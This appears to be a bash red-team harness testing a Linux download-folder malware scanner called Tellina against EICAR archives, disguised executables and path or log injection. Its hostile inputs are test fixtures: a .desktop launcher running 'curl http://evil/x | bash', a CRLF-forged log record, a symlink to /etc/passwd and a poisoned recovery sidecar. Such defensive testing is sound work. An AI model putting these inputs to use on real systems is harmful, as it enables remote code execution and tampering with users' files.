#!/usr/bin/env bash
# Tellina v2 RED TEAM: an adversarial attempt to defeat the tool's stated
# guarantees, not a correctness harness. Every case is a real attack. Each is
# scored against what Tellina CLAIMS to do, so a documented limitation that
# slips through is reported honestly as "BYPASS (documented)", not hidden.
#
# Scoring:
#   DEFENDED             the attack was stopped (this is a win)
#   BYPASS (documented)  the attack got through AND Tellina already says it can't
#                        stop this (a known, honest limit; not a failure)
#   VULNERABILITY        a stated guarantee failed (a real problem; should be 0)
#
# Runs headless: --scan-once for adjudication attacks, the real inotify loop for
# watch-loop attacks. The desktop-notify call fails gracefully (no D-Bus needed).
#
# Needs: clamscan, file, sha256sum, stat, inotifywait, setsid; zip/tar optional.
set -uo pipefail
export LC_ALL=C

ROOT="$(cd "$(dirname "$0")/.." && pwd)"
TELLINA="$ROOT/bin/tellina"
TMP=$(mktemp -d)
trap 'stop_service 2>/dev/null; rm -rf "$TMP"' EXIT

WATCH="$TMP/watch"
QUAR="$TMP/quarantine"
RT="$TMP/runtime"
OUTSIDE="$TMP/OUTSIDE"          # a location OUTSIDE the watch root (attack target)
mkdir -p "$WATCH" "$QUAR" "$RT" "$OUTSIDE"

EICAR='X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

DEFENDED=0
BYPASS=0
VULN=0
SVC_PID=""

hr() { printf '%s\n' "------------------------------------------------------------"; }
case_hdr() { printf '\n[%s] %s\n' "$1" "$2"; }
attack() { printf '  attack:   %s\n' "$*"; }
observe() { printf '  observed: %s\n' "$*"; }

defended() { printf '  VERDICT:  DEFENDED  (%s)\n' "$*"; DEFENDED=$((DEFENDED+1)); }
bypass()   { printf '  VERDICT:  BYPASS (documented)  (%s)\n' "$*"; BYPASS=$((BYPASS+1)); }
vuln()     { printf '  VERDICT:  ** VULNERABILITY **  (%s)\n' "$*"; VULN=$((VULN+1)); }

# scan_once <path> [ENV=val ...]  -> prints tellina log to stdout
scan_once() {
  local f="$1"; shift || true
  env "$@" DOWNLOAD_WATCH_DIR="$WATCH" DOWNLOAD_QUARANTINE_DIR="$QUAR" \
    XDG_RUNTIME_DIR="$RT" DOWNLOAD_STABLE_SEC=0 STABLE_WAIT=0 \
    "$TELLINA" --scan-once "$f" 2>&1
}

# A recent artifact in the quarantine dir means "blocked". This counts a .meta
# record too: a RAM-held malicious file is unlinked and leaves only its metadata,
# no payload copy, so a payload-only check would miss a real, successful block.
in_quarantine() { find "$QUAR" -type f -newermt '-90 seconds' 2>/dev/null | grep -q . ; }
reset_quar() { rm -rf "${QUAR:?}"/* 2>/dev/null; }

start_service() {
  : >"$TMP/svc.log"
  setsid env DOWNLOAD_WATCH_DIR="$WATCH" DOWNLOAD_QUARANTINE_DIR="$QUAR" \
    XDG_RUNTIME_DIR="$RT" DOWNLOAD_STABLE_SEC=0 \
    "$TELLINA" >"$TMP/svc.log" 2>&1 &
  SVC_PID=$!
  local i
  for i in $(seq 1 100); do grep -q ' START ' "$TMP/svc.log" 2>/dev/null && return 0; sleep 0.1; done
  return 0
}
stop_service() {
  [[ -n "${SVC_PID:-}" ]] || return 0
  kill -TERM -- -"$SVC_PID" 2>/dev/null || true
  wait "$SVC_PID" 2>/dev/null || true
  SVC_PID=""
}

echo "=================================================================="
echo " Tellina v2  --  RED TEAM  (adversarial; documented bypasses shown)"
echo "=================================================================="
echo " target binary: $TELLINA"
echo " watch:         $WATCH"
echo " quarantine:    $QUAR"
echo " outside root:  $OUTSIDE  (attack target for escape tests)"
echo " backend:       $(command -v clamdscan >/dev/null && echo 'clamdscan if daemon up, else clamscan' || echo clamscan)"

hr; echo " GROUP 1  --  malware detection and archive evasion"; hr

# D1 plain EICAR
reset_quar
F="$WATCH/d1.com"; printf '%s\n' "$EICAR" >"$F"
case_hdr D1 "known malware, plain (EICAR test virus)"
attack "drop the standard AV test virus straight into Downloads"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
  observe "quarantined; removed from Downloads"; defended "signature match -> quarantine"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "known malware not quarantined"; fi

# D2 EICAR inside a zip
reset_quar
case_hdr D2 "malware hidden in a .zip archive"
if command -v zip >/dev/null; then
  d=$(mktemp -d); printf '%s\n' "$EICAR" >"$d/e.com"; ( cd "$d" && zip -q d2.zip e.com )
  F="$WATCH/d2.zip"; cp "$d/d2.zip" "$F"; rm -rf "$d"
  attack "zip the virus and drop the archive (does the scanner look inside?)"
  out=$(scan_once "$F")
  if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
    observe "quarantined; scanner unpacked the zip"; defended "archive unpacked and matched"
  else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "malware in plain zip not caught"; fi
else observe "zip not installed"; echo "  VERDICT:  SKIPPED"; fi

# D3 EICAR inside tar.gz
reset_quar
case_hdr D3 "malware hidden in a .tar.gz archive"
if command -v tar >/dev/null; then
  d=$(mktemp -d); printf '%s\n' "$EICAR" >"$d/e.com"; ( cd "$d" && tar czf d3.tar.gz e.com )
  F="$WATCH/d3.tar.gz"; cp "$d/d3.tar.gz" "$F"; rm -rf "$d"
  attack "gzip+tar the virus and drop it"
  out=$(scan_once "$F")
  if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
    observe "quarantined; scanner unpacked the tarball"; defended "archive unpacked and matched"
  else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "malware in tar.gz not caught"; fi
else observe "tar not installed"; echo "  VERDICT:  SKIPPED"; fi

# D4 nested zip
reset_quar
case_hdr D4 "malware double-zipped (zip inside a zip)"
if command -v zip >/dev/null; then
  d=$(mktemp -d); printf '%s\n' "$EICAR" >"$d/e.com"
  ( cd "$d" && zip -q inner.zip e.com && zip -q d4.zip inner.zip )
  F="$WATCH/d4.zip"; cp "$d/d4.zip" "$F"; rm -rf "$d"
  attack "nest the virus one archive deep to dodge shallow scanning"
  out=$(scan_once "$F")
  if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
    observe "quarantined; scanner recursed into nested zip"; defended "recursive unpack matched"
  else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "nested-zip malware not caught"; fi
else observe "zip not installed"; echo "  VERDICT:  SKIPPED"; fi

# D5 password-protected zip  (KNOWN AV limitation)
reset_quar
case_hdr D5 "malware in a password-protected .zip"
if command -v zip >/dev/null; then
  d=$(mktemp -d); printf '%s\n' "$EICAR" >"$d/e.com"; ( cd "$d" && zip -q -P hunter2 d5.zip e.com )
  F="$WATCH/d5.zip"; cp "$d/d5.zip" "$F"; rm -rf "$d"
  attack "encrypt the archive so the scanner cannot read the contents"
  out=$(scan_once "$F")
  if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
    observe "quarantined (this build flags encrypted archives)"; defended "encrypted-archive heuristic caught it"
  elif [[ -f "$F" ]] && grep -q ' OK ' <<<"$out"; then
    observe "released clean; scanner cannot see inside an encrypted archive"
    bypass "signature scanners cannot read encrypted archives -- inherent AV limit"
  else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; bypass "encrypted archive not scannable"; fi
else observe "zip not installed"; echo "  VERDICT:  SKIPPED"; fi

hr; echo " GROUP 2  --  disguised executables"; hr

# G1 ELF as pdf
reset_quar
F="$WATCH/invoice.pdf"; cp "$(command -v cat)" "$F"
case_hdr G1 "a real Linux program renamed invoice.pdf"
attack "hand you an executable wearing a .pdf name"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q 'disguised executable' <<<"$out"; then
  observe "quarantined by file-type check (no signature needed)"; defended "type/extension mismatch caught"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "disguised executable released"; fi

# G2 ELF as png
reset_quar
F="$WATCH/photo.png"; cp "$(command -v cat)" "$F"
case_hdr G2 "a real Linux program renamed photo.png"
attack "same trick with an image extension"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q 'disguised executable' <<<"$out"; then
  observe "quarantined by file-type check"; defended "type/extension mismatch caught"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "disguised executable released"; fi

# G3 ELF with no doc extension  (BY-DESIGN gap)
reset_quar
F="$WATCH/installer"; cp "$(command -v cat)" "$F"
case_hdr G3 "a real (unknown) program named 'installer', no doc extension"
attack "ship a custom binary that is honestly shaped like a program"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
  observe "quarantined"; defended "scanner had a signature for it"
elif [[ -f "$F" ]] && grep -q ' OK ' <<<"$out"; then
  observe "released; disguise check only fires on doc/image extensions, and ClamAV had no signature"
  bypass "an unknown executable that is NOT masquerading as a document is gated only by signatures"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; bypass "unknown binary, signature-only gate"; fi

# G4 shebang text -- must NOT be a false positive
reset_quar
F="$WATCH/notes.txt"; printf '#!/bin/sh\n# just notes\necho hi\n' >"$F"
case_hdr G4 "plain text that begins with #!  (false-positive probe)"
attack "trick the disguise check into quarantining a harmless text file"
out=$(scan_once "$F")
if [[ -f "$F" ]] && grep -q ' OK ' <<<"$out" && ! grep -q ' QUARANTINE ' <<<"$out"; then
  observe "released clean; not misflagged"; defended "MIME-type check avoids the false positive"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "harmless text wrongly quarantined (false positive)"; fi

# G5 malicious .desktop launcher  (top Linux download vector, 2025-2026)
reset_quar
F="$WATCH/Procurement.desktop"
printf '[Desktop Entry]\nType=Application\nName=Procurement\nExec=bash -c "curl http://evil/x | bash"\nTerminal=false\n' >"$F"
case_hdr G5 "a .desktop launcher that runs curl | bash when double-clicked"
attack "ship a launcher (not a program) that executes a command on open"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q 'desktop launcher' <<<"$out"; then
  observe "quarantined by the launcher check; ClamAV and file(1) both see only text"
  defended "downloaded .desktop launcher quarantined (fix)"
else
  observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"
  vuln "malicious .desktop launcher released"
fi

# G6 unlink disposition: RAM-held malware is unlinked, not re-copied to disk
reset_quar
F="$WATCH/g6.com"; printf '%s\n' "$EICAR" >"$F"
case_hdr G6 "RAM-held malware must not be re-persisted to the disk"
attack "confirm the blocked malware is not written into an on-disk quarantine copy"
out=$(scan_once "$F")
payload=$(find "$QUAR" -type f ! -name '*.meta' 2>/dev/null | head -1)
if [[ ! -f "$F" ]] && grep -q 'not retained (unlinked from RAM hold)' <<<"$out" && [[ -z "$payload" ]]; then
  observe "malware unlinked from the RAM hold; only a metadata record remains on disk"
  defended "no second on-disk copy of the malware is created (fix)"
elif [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
  observe "blocked, but a payload copy was written to disk: $payload"
  bypass "held malware still re-persisted (in-place path or preserve disposition)"
else
  observe "$(grep -E 'QUARANTINE|OK|SKIP' <<<"$out" | tail -1)"; vuln "held malware not blocked"
fi

hr; echo " GROUP 3  --  injection and path-escape attacks"; hr

# E1 log injection via CRLF in filename
reset_quar
FAKE_TS="2026-01-01T00:00:00"
# Build a name = <CR> + a fake timestamped "OK ... clean" record + <LF>. If the
# CR/LF survived into the log, the fake record would appear as its OWN line
# starting with FAKE_TS. A real Tellina line always starts with today's date.
F=$WATCH/$'e1inject\r'"$FAKE_TS"$' OK 0B | forged clean line\n.com'
printf '%s\n' "$EICAR" >"$F"
case_hdr E1 "filename carrying a fake 'OK ... forged clean line' with CR/LF"
attack "smuggle a forged journal record through the filename"
out=$(scan_once "$F")
if printf '%s\n' "$out" | grep -qE "^${FAKE_TS} "; then
  observe "a log line STARTS with the forged timestamp -- a new forged record slipped in"
  vuln "log/journal injection succeeded"
else
  nreal=$(printf '%s\n' "$out" | grep -cE '^[0-9]{4}-[0-9]{2}-[0-9]{2}T')
  observe "CR/LF scrubbed to spaces; forged text trapped inline; all $nreal lines carry today's date, none start with the forged timestamp"
  defended "log() strips CR/LF so a filename cannot open a new journal record"
fi

# E2 symlink pointing outside the watch root
reset_quar
ln -sf /etc/passwd "$WATCH/list.txt"
before=$(sha256sum /etc/passwd 2>/dev/null | awk '{print $1}')
case_hdr E2 "a symlink in Downloads pointing at /etc/passwd"
attack "get Tellina to act on a file outside the watched folder"
out=$(scan_once "$WATCH/list.txt")
after=$(sha256sum /etc/passwd 2>/dev/null | awk '{print $1}')
rm -f "$WATCH/list.txt"
if grep -q 'SKIP path outside watch root' <<<"$out" && [[ "$before" == "$after" ]]; then
  observe "refused: SKIP path outside watch root; /etc/passwd untouched"; defended "realpath confinement to watch root"
elif [[ "$before" == "$after" ]]; then
  observe "$(grep -E 'SKIP|OK|QUARANTINE' <<<"$out" | tail -1); target untouched"; defended "target not modified"
else observe "target file changed"; vuln "acted on a file outside the watch root"; fi

# E3 crafted .ingress sidecar tries to make the crash-sweep write outside Downloads
reset_quar
rm -rf "${RT:?}/tellina/hold" 2>/dev/null; mkdir -p "$RT/tellina/hold"
CANARY="$OUTSIDE/secret.conf"; printf 'DO-NOT-OVERWRITE\n' >"$CANARY"
canary_before=$(sha256sum "$CANARY" | awk '{print $1}')
HELD="$RT/tellina/hold/20260101-000000__pwned"
printf 'clean stranded payload\n' >"$HELD"
hsize=$(stat -c%s "$HELD"); hsha=$(sha256sum "$HELD" | awk '{print $1}')
printf '%s\n%s\n%s\n%s\n' "$CANARY" "$hsize" "$hsha" "644" >"$HELD.ingress"
case_hdr E3 "poisoned crash-recovery record aimed at a file outside Downloads"
attack "forge the recovery sidecar so 'release' writes to $CANARY"
out=$(env DOWNLOAD_WATCH_DIR="$WATCH" DOWNLOAD_QUARANTINE_DIR="$QUAR" XDG_RUNTIME_DIR="$RT" \
      DOWNLOAD_STABLE_SEC=0 "$TELLINA" --sweep-once 2>&1)
canary_after=$(sha256sum "$CANARY" | awk '{print $1}')
if [[ "$canary_before" == "$canary_after" ]] && grep -q 'outside watch root' <<<"$out"; then
  observe "escape refused; file redirected into Downloads; $CANARY untouched"; defended "sweep confines release to the watch root"
elif [[ "$canary_before" == "$canary_after" ]]; then
  observe "canary untouched: $(grep -E 'SWEEP|WARN|OK' <<<"$out" | tail -1)"; defended "no write outside the watch root"
else observe "canary was overwritten"; vuln "crash-sweep wrote outside the watch root"; fi
rm -rf "$RT/tellina/hold"/* 2>/dev/null

# E4 dash-leading filename (option-injection probe)
reset_quar
F="$WATCH/-rf.com"; printf '%s\n' "$EICAR" >"$F"
case_hdr E4 "malware named '-rf.com' (option-injection probe)"
attack "a leading dash that a careless tool might read as a command flag"
out=$(scan_once "$F")
if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out"; then
  observe "handled as a path; quarantined"; defended "paths are quoted/absolute, not parsed as options"
else observe "$(grep -E 'QUARANTINE|OK|SKIP|ERROR' <<<"$out" | tail -1)"; vuln "dash-name mishandled"; fi

hr; echo " GROUP 4  --  size limits"; hr

# S1 malware too big for the RAM hold but under the scan cap -> scanned in place
reset_quar
F="$WATCH/s1.com"; printf '%s\n' "$EICAR" >"$F"
case_hdr S1 "malware above the RAM-hold cap (forced scan-in-place)"
attack "exceed the hold cap so the file is scanned in place, not in RAM"
out=$(scan_once "$F" DOWNLOAD_RAM_HOLD_MAX=10)
if [[ ! -f "$F" ]] && grep -q ' QUARANTINE ' <<<"$out" && ! grep -q ' HOLD ' <<<"$out"; then
  observe "scanned in place and quarantined (no HOLD line)"; defended "in-place path still blocks malware"
else observe "$(grep -E 'QUARANTINE|OK|SKIP|HOLD' <<<"$out" | tail -1)"; vuln "in-place malware not blocked"; fi

# S2 malware above the max scan size  (KNOWN, documented bypass)
reset_quar
F="$WATCH/s2.com"; printf '%s\n' "$EICAR" >"$F"
case_hdr S2 "malware larger than the 2 GiB scan cap (simulated)"
attack "exceed the max scan size so the file is skipped, not scanned"
out=$(scan_once "$F" DOWNLOAD_MAX_SCAN_BYTES=10)
if [[ -f "$F" ]] && grep -q 'SKIP too large' <<<"$out" && ! in_quarantine; then
  observe "left in place, logged SKIP too large, NOT scanned"
  bypass "files over the scan cap are logged only -- stated in README/THREAT-MODEL"
elif [[ ! -f "$F" ]]; then observe "quarantined unexpectedly"; vuln "size policy inconsistent"; 
else observe "$(grep -E 'SKIP|OK|QUARANTINE' <<<"$out" | tail -1)"; bypass "oversize not scanned"; fi

# S3 disguised executable ABOVE the scan cap -> caught by header-only check (FIX)
reset_quar
F="$WATCH/huge.pdf"; cp "$(command -v cat)" "$F"
case_hdr S3 "disguised executable above the scan cap (padded past the limit)"
attack "pad a disguised executable past the scan cap so it skips the content scan"
out=$(scan_once "$F" DOWNLOAD_MAX_SCAN_BYTES=10)
if [[ ! -f "$F" ]] && grep -q 'disguised executable' <<<"$out"; then
  observe "quarantined by the header-only file-type check despite exceeding the scan cap"
  defended "oversize files still get the cheap disguise check (fix)"
else
  observe "$(grep -E 'QUARANTINE|SKIP|OK' <<<"$out" | tail -1)"
  vuln "oversize disguised executable released"
fi

hr; echo " GROUP 5  --  the real inotify watch loop (live service)"; hr

# L1 live EICAR end to end
reset_quar
case_hdr L1 "live service: drop EICAR into the watched folder"
attack "attack the running service, not the one-shot mode"
start_service
printf '%s\n' "$EICAR" >"$WATCH/l1.com"
for i in $(seq 1 120); do grep -q 'QUARANTINE\|OK ' "$TMP/svc.log" 2>/dev/null && break; sleep 0.25; done
sleep 1
stop_service
if [[ ! -f "$WATCH/l1.com" ]] && grep -q ' QUARANTINE ' "$TMP/svc.log"; then
  observe "quarantined by the live loop"; defended "end-to-end block in the real service"
else observe "$(grep -E 'QUARANTINE|OK|SKIP' "$TMP/svc.log" | tail -1)"; vuln "live loop did not block EICAR"; fi

# L2 newline-in-filename against the live loop  (FIXED via safety-net rescan)
reset_quar
case_hdr L2 "live service: malware in a filename containing a newline"
attack "name the file so the watch loop's line reader splits it apart"
start_service
NL=$WATCH/$'evil\npwn.com'
printf '%s\n' "$EICAR" >"$NL" 2>/dev/null
for i in $(seq 1 160); do in_quarantine && break; sleep 0.25; done
sleep 1
stop_service
if [[ ! -f "$NL" ]] && in_quarantine && grep -q 'RESCAN safety sweep' "$TMP/svc.log"; then
  observe "event loop could not name it; NUL-safe safety rescan swept the watch root and quarantined it"
  defended "safety-net rescan recovers newline-named files the event stream splits (fix)"
elif [[ ! -f "$NL" ]] && in_quarantine; then
  observe "newline-named file quarantined"
  defended "newline-named file recovered and quarantined (fix)"
else
  observe "$(grep -E 'SKIP|QUARANTINE|OK|RESCAN' "$TMP/svc.log" | tail -1)"
  vuln "newline-named malware not caught after fix"
fi
rm -f "$NL" 2>/dev/null

hr
echo " RED TEAM SUMMARY"
hr
printf '  DEFENDED (attack stopped):        %d\n' "$DEFENDED"
printf '  BYPASS  (documented limitation):  %d\n' "$BYPASS"
printf '  VULNERABILITY (unexpected fail):  %d\n' "$VULN"
hr
if (( VULN == 0 )); then
  echo "  RESULT: no unexpected vulnerabilities. Every remaining bypass is a"
  echo "          limitation Tellina already documents: encrypted archives it"
  echo "          cannot read, known-signature malware padded past the scan cap,"
  echo "          and unknown binaries that are not disguised as documents."
else
  echo "  RESULT: $VULN unexpected failure(s) above -- investigate before shipping."
fi
hr
exit "$VULN"
